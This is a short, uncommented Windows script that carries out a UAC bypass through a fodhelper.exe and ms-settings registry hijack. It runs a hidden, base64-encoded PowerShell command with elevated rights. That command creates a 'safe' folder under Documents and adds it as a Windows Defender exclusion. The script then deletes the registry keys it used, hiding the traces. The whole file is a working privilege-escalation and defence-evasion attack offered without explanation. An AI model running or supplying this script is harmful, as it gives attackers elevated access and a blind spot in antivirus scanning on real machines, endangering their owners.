$OMG="powershell.exe -w h -NoP -NonI -Exec Bypass -enc JABwAGEAdABoAD0AIgAkAEUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwARABvAGMAdQBtAGUAbgB0AHMAXABzAGEAZgBlACIAOwBtAGsAZABpAHIAIAAkAHAAYQB0AGgAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJABwAGEAdABoAA==";
C:\Windows\System32\reg.exe add "HKCU\Software\Classes\.omg\Shell\Open\command" /d $OMG /f;
C:\Windows\System32\reg.exe add "HKCU\Software\Classes\ms-settings\CurVer" /d ".omg" /f;
fodhelper.exe;
Start-Sleep -s 3;
C:\Windows\System32\reg.exe delete "HKCU\Software\Classes\.omg\" /f;
C:\Windows\System32\reg.exe delete "HKCU\Software\Classes\ms-settings\" /f;
